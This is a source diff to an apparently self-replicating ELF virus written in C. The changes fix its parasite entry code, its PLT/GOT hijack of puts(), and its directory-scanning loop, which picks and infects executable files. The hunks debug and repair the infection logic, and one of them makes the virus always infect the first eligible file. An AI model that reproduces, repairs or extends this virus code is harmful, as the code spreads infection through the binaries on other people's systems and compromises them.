@@ -128,7 +128,9 @@ typedef struct elfbin {
 
 _start()
 {
+#if 0
 	struct bootstrap_data bootstrap;
+#endif
 	/*
 	 * Save register state before executing parasite
 	 * code.
@@ -151,18 +153,20 @@ _start()
 	 "push %r14	\n"
 	 "push %r15	  ");
 	
+#if 0
 	__ASM__ ("mov 0x08(%%rbp), %%rcx " : "=c" (bootstrap.argc));
         __ASM__ ("lea 0x10(%%rbp), %%rcx " : "=c" (bootstrap.argv));
-
+#endif
 	/*
 	 * Load bootstrap pointer as argument to do_main()
 	 * and call it.
 	 */
 	__ASM__ ( 
+#if 0
 	 "leaq %0, %%rdi\n"
-	 "call do_main   " :: "g"(bootstrap)
+#endif
+	 "call do_main   " //:: "g"(bootstrap)
 	);
-
 	/*
 	 * Restore register state
 	 */
@@ -560,7 +564,7 @@ int load_target_writeable(const char *path, elfbin_t *elf)
  */
 int infect_pltgot(elfbin_t *target, Elf64_Addr new_fn_addr)
 {
-	int i, symindex = -1;	
+	int i, j = 0, symindex = -1;	
 	Elf64_Sym *symtab;
 	Elf64_Rela *jmprel;
 	Elf64_Dyn *dyn = target->dyn;
@@ -568,8 +572,8 @@ int infect_pltgot(elfbin_t *target, Elf64_Addr new_fn_addr)
 	char *strtab;
 	size_t strtab_size;
 	size_t jmprel_size;
-	Elf64_Addr gotaddr;
-	Elf64_Off gotoff;
+	Elf64_Addr gotaddr = 0; // INITIALIZE!
+	Elf64_Off gotoff = 0;
 	
 	for (i = 0; dyn[i].d_tag != DT_NULL; i++) {
 		switch(dyn[i].d_tag) {
@@ -601,6 +605,7 @@ int infect_pltgot(elfbin_t *target, Elf64_Addr new_fn_addr)
 	
 	for (i = 0; symtab[i].st_name <= strtab_size; i++) {
 		if (!_strcmp(&strtab[symtab[i].st_name], "puts")) {
+			DEBUG_PRINT("puts symbol index: %d\n", i);
 			symindex = i;
 			break;
 		}	
@@ -610,9 +615,10 @@ int infect_pltgot(elfbin_t *target, Elf64_Addr new_fn_addr)
 		return -1;
 	}
 	for (i = 0; i < jmprel_size / sizeof(Elf64_Rela); i++) {
-		if (ELF64_R_SYM(jmprel->r_info) == symindex) { // found rel entry for puts()
+		if (!_strcmp(&strtab[symtab[ELF64_R_SYM(jmprel->r_info)].st_name], "puts")) {
 			gotaddr = jmprel->r_offset;
 			gotoff = target->dataOff + (jmprel->r_offset - target->dataVaddr);
+			DEBUG_PRINT("gotaddr: %x gotoff: %x\n", gotaddr, gotoff);
 			break;
 		}
 	}
@@ -734,14 +740,14 @@ void do_main(struct bootstrap_data *bootstrap)
 		for (fcount = 0, bpos = 0; bpos < nread; bpos++) {
 			d = (struct linux_dirent64 *) (dbuf + bpos);
     			bpos += d->d_reclen - 1;
-			if (!_strcmp(d->d_name, &bootstrap->argv[0][2])) {
+			if (!_strcmp(d->d_name, VIRUS_LAUNCHER_NAME)) {
 				continue;
 			}
 			if (d->d_name[0] == '.')
 				continue;
 			if (check_criteria(fpath = full_path(d->d_name, dir, &heap)) < 0)
-				continue;
-			if (!_strcmp(&bootstrap->argv[0][2], VIRUS_LAUNCHER_NAME) && icount == 0)
+				continue; 
+			if (icount == 0)
 				goto infect;
 			rnum = get_random_number(10);
                         if (rnum != LUCKY_NUMBER)
